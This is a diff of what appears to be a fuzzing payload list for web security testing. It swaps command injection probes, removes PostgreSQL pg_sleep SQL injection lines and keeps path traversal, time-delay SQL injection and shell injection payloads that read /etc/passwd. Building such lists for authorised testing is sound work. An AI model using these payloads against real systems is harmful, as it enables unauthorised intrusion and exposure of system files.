@@ -40,8 +40,8 @@ prototype
 $PATH
 '$PATH
 "$PATH
-|ls #
-`ls`
+|id #
+`id`
 ../../../../../../../etc/passwd
 ..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%00
@@ -91,16 +91,6 @@ sleep(4)#
 ));waitfor delay '0:0:4'--
 '));waitfor delay '0:0:4'--
 "));waitfor delay '0:0:4'--
-pg_sleep(4)--
-1 or pg_sleep(4)--
-" or pg_sleep(4)--
-' or pg_sleep(4)--
-1) or pg_sleep(4)--
-") or pg_sleep(4)--
-') or pg_sleep(4)--
-1)) or pg_sleep(4)--
-")) or pg_sleep(4)--
-')) or pg_sleep(4)--
 $(`cat /etc/passwd`)
 |cat /etc/passwd
 ;cat /etc/passwd#
